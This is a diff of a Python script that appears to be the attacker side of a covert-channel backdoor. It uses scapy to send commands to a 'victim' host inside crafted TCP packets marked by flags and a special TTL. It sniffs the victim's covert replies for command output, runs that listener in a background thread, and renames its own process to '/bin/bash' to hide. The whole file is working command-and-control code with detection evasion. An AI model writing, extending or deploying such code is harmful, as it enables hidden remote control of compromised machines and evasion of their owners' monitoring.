@@ -20,7 +20,7 @@ TTL=222
 TTLKEY=234
 # random secret key (both the client and server must match this key)
 
-victim=("192.168.0.11",9999)
+victim=("192.168.0.3",9999)
 messages = []
 authentication ="1337"
 setFlag = "E"
@@ -47,22 +47,19 @@ def packatizer(msg):
     packets = []
     #If the length of the number is larger than what is allowed in one packet, split it
     counter = 0
-    #Create a UID to put in every packet, so that we know what session the
-    #Packets are part of
-    UID = str(uuid.uuid1())
 
     #If not an array (if there is only one packet.)
     if(type(msg) is str):
         #The transmissions position and total will be 1.
         # i.e. 1/1 message to send.
-        packets.append(craft(msg,counter+1,1,UID))
+        packets.append(craft(msg))
     #If an array (if there is more than one packet)
     elif(type(msg) is list):
         while (counter < len(msg)):
             #The position will be the array element and the total will be the
             # length.
             # i.e. 1/3 messages to send.
-            packets.append(craft(msg[counter],counter+1,len(msg),UID))
+            packets.append(craft(msg[counter]))
             counter = counter + 1
     packets.append(IP(dst=victim[0], ttl=TTL)/TCP(sport=myip[1],dport=victim[1], flags="U"))
     return packets
@@ -91,9 +88,7 @@ def server():
             secret_send(command)
 
 def commandResult(packet):
-    global ttlKey
-    global args
-    global cipher
+    global TTLKEY
     global messages
     ttl = packet[IP].ttl
     if(packet.haslayer(IP) and ttl == TTLKEY):
@@ -107,16 +102,20 @@ def commandResult(packet):
             messages.append(text_from_bits(covertContent))
         #End Flag detected
         elif flag == 0x20:
-            payload=''.join(messages).decode("utf-8")
-            print ("The Output: ",payload)
+            payload=str(''.join(messages)[2:-2]).replace("\\n",'\n')
+            print ('\n',payload)
             messages = []
     else:
         return
 
-def commandSniffer(threadName, infectedIP): #TODO call fucntion inside thread
-    sniff(timeout=10, filter="tcp and host "+victim[0], prn=commandResult)
+def commandSniffer():
+    sniff(filter="tcp and host "+victim[0], prn=commandResult)
 
 setproctitle.setproctitle("/bin/bash") #set fake process name
 #print(setproctitle.getproctitle())
+
+sniffThread = threading.Thread(target=commandSniffer)
+sniffThread.daemon = True
+sniffThread.start()
 
 server()
